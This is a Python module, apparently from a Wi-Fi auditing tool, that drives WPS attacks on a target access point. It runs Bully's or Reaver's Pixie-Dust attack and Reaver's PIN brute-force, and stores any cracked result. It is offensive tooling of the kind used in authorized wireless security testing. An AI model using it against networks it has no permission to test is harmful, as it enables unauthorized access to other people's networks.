#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..util.color import Color
from ..config import Configuration

class AttackWPS(Attack):
    def __init__(self, target):
        super(AttackWPS, self).__init__(target)
        self.success = False
        self.crack_result = None

    def run(self):
        ''' Run all WPS-related attacks '''

        # Drop out if user specified to not use Reaver/Bully
        if Configuration.use_pmkid_only:
            Color.pl('\r{!} {O}--pmkid{R} set, ignoring WPS attack on ' +
                    '{O}%s{W}' % self.target.essid)
            self.success = False
            return False

        if Configuration.no_wps:
            Color.pl('\r{!} {O}--no-wps{R} set, ignoring WPS attack on ' +
                    '{O}%s{W}' % self.target.essid)
            self.success = False
            return False

        if Configuration.use_bully:
            return self.run_bully()
        else:
            return self.run_reaver()

        return False


    def run_bully(self):
        # Bully: Pixie-dust
        from ..tools.bully import Bully
        bully = Bully(self.target)
        bully.run()
        bully.stop()
        self.crack_result = bully.crack_result
        self.success = self.crack_result is not None
        if self.success:
            return True

        # Bully: WPS PIN Attack
        return self.success


    def run_reaver(self):
        from ..tools.reaver import Reaver
        reaver = Reaver(self.target)

        # Reaver: PixieDust then WPS PIN attack.
        for pixie_dust in [True, False]:
            if pixie_dust and not Configuration.wps_pixie:
                continue  # Avoid Pixie-Dust attack
            if not pixie_dust and not Configuration.wps_pin:
                continue  # Avoid PIN attack

            if Configuration.wps_pixie and pixie_dust and \
                    not reaver.is_pixiedust_supported():
                Color.pl('{!} {R}your version of "reaver" does not support the ' +
                        '{O}WPS pixie-dust attack{W}')
                continue

            reaver = Reaver(self.target, pixie_dust=pixie_dust)
            try:
                reaver.run()
            except KeyboardInterrupt:
                Color.pl('\n{!} {O}Interrupted{W}')
                continue
            self.crack_result = reaver.crack_result
            self.success = self.crack_result is not None
            if self.success:
                return True

        return False

